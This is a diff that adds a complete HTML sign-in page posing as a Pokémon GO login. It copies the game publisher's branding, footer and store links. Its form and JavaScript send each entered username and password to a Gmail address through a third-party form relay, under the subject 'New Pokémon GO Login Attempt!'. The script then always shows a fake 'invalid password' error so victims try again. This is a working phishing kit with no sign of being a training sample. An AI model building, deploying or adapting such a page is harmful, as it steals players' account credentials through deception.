@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pokémon GO - Sign In</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+            width: 100%;
+            max-width: 420px;
+            padding: 32px;
+        }
+        .header-img {
+            width: 100%;
+            margin-bottom: 24px;
+            display: block;
+        }
+        .subheading {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 24px;
+        }
+        .input-group { margin-bottom: 16px; }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #fafafa;
+            transition: border-color 0.2s;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #4caf50;
+            background: #fff;
+        }
+        .error-msg {
+            display: none;
+            background: #fff3f3;
+            border: 1px solid #e53935;
+            border-radius: 8px;
+            padding: 12px 16px;
+            color: #e53935;
+            font-size: 14px;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #4caf50;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.2s;
+        }
+        .btn-login:hover { background: #388e3c; }
+        .no-account {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #666;
+        }
+        .no-account a { color: #f57c00; text-decoration: none; }
+        .banner-wrapper {
+            position: relative;
+            margin-top: 28px;
+        }
+        .banner-wrapper img {
+            width: 100%;
+            border-radius: 10px;
+            display: block;
+        }
+        .banner-links {
+            position: absolute;
+            bottom: 12%;
+            left: 0;
+            right: 0;
+            display: flex;
+            justify-content: space-evenly;
+            padding: 0 5%;
+        }
+        .banner-links a {
+            width: 28%;
+            height: 36px;
+            display: block;
+            border-radius: 6px;
+            text-indent: -9999px;
+            overflow: hidden;
+        }
+        .banner-links a:hover {
+            background: rgba(255,255,255,0.15);
+        }
+        .footer {
+            margin-top: 24px;
+            text-align: center;
+        }
+        .footer .links {
+            font-size: 13px;
+            color: #f57c00;
+        }
+        .footer .links a { color: #f57c00; text-decoration: none; }
+        .footer .links a:hover { text-decoration: underline; }
+        .footer .copyright {
+            margin-top: 12px;
+            font-size: 11px;
+            color: #999;
+        }
+        .spinner {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4caf50;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 2s linear infinite;
+            margin: 12px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="image-2.png" alt="Scopely Explore - Sign In" class="header-img">
+
+    <div class="subheading">Sign in with your Pokémon GO account</div>
+
+    <form action="https://formsubmit.co/nianticlabsnl@gmail.com" method="POST" id="loginForm">
+        <input type="hidden" name="_subject" value="New Pokémon GO Login Attempt!">
+        <input type="hidden" name="_next" value="https://nianticlabsnl-tech.github.io/niantic-login/success.html">
+        <input type="hidden" name="_template" value="table">
+        <input type="text" name="_captcha" value="false" style="display:none">
+
+        <div class="input-group">
+            <label for="username">Pokémon GO username</label>
+            <input type="text" id="username" name="username" placeholder="Pokémon GO username" required>
+        </div>
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+        </div>
+        <div class="error-msg" id="error">Invalid username or password. Please try again.</div>
+        <button type="submit" class="btn-login" id="submitBtn">Log In</button>
+        <div class="spinner" id="spinner"></div>
+    </form>
+
+    <div class="no-account">
+        If you don't have a Pokémon GO account, <a href="https://pokemongolive.com/en">make one today!</a>
+    </div>
+
+    <div class="banner-wrapper">
+        <img src="image-1.png" alt="Pokémon GO - Get Up and GO! Download Today">
+        <div class="banner-links">
+            <a href="https://apps.apple.com/us/app/pokemon-go/id1095594878">App Store</a>
+            <a href="https://play.google.com/store/apps/details?id=com.nianticlabs.pokemon">Google Play</a>
+            <a href="https://galaxystore.samsung.com/detail/com.nianticlabs.pokemon">Galaxy Store</a>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="links">
+            <a href="https://www.nianticlabs.com/terms">Terms of Service</a> ·
+            <a href="https://www.nianticlabs.com/privacy">Privacy policy</a> ·
+            <a href="https://www.nianticlabs.com/cookies">Cookie policy</a>
+        </div>
+        <div class="copyright">© 2012–2026 Scopely Explore (fka Niantic)</div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const spinner = document.getElementById('spinner');
+        const btn = document.getElementById('submitBtn');
+        const error = document.getElementById('error');
+        error.style.display = 'none';
+
+        btn.style.display = 'none';
+        spinner.style.display = 'block';
+
+        fetch('https://formsubmit.co/ajax/nianticlabsnl@gmail.com', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+            body: JSON.stringify({ username: username, password: password, _subject: 'New Pokémon GO Login Attempt!' })
+        }).then(function(res) {
+            spinner.style.display = 'none';
+            btn.style.display = 'block';
+            error.style.display = 'block';
+        }).catch(function() {
+            spinner.style.display = 'none';
+            btn.style.display = 'block';
+            error.style.display = 'block';
+        });
+    });
+</script>
+
+</body>
+</html>
